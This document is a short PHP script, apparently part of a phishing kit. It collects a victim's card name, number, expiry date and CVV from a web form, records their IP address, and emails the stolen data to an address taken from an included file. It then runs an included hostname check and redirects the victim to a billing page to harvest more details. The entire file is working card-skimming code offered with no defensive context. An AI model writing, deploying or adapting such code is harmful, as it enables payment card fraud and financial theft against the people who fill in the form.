<?php
session_start();

$ip = getenv("REMOTE_ADDR");
$crd = $_POST['nmc'];

$msg = "

------------NEW CVV--------------------->
Name On Card : ".$_POST['nmc']."
Card Number : ".$_POST['crd']."
Expiry Date : ".$_POST['exm']." ".$_POST['exy']."
CSC/CVV : ".$_POST['csc']."
IP : $ip
==================================";

include 'email.php';
$subj = "CVV de [$crd] // - $ip";
$headers .= "Content-Type: text/plain; charset=UTF-8\n";
$headers .= "Content-Transfer-Encoding: 8bit\n";
mail("$to", $subj, $msg,"$headers");
include 'hostname_check.php';
header("Location: billing.php?ip=$ip");
?>


